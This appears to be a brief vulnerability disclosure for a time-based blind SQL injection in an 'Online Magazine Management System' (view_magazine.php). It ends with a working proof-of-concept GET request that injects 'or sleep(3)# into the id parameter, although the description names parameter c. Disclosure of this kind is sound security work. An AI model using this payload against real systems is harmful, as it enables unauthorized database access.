# Online Magazine Management System SQL blind injection2(SQLI)

## Description

    In view_magazine.php, parameter c is not filtered and directly connected to the SQL statement, causing SQL injection
...
| ![image-20250910162145184](Online Magazine Management System SQL blind injection2(SQLI) .assets/image-20250910162145184.png) |
| ------------------------------------------------------------ |

POC

```php
GET /magazines/index.php?page=view_magazine&id=1'or+sleep(3)%23 HTTP/1.1
Host: 10.211.55.3
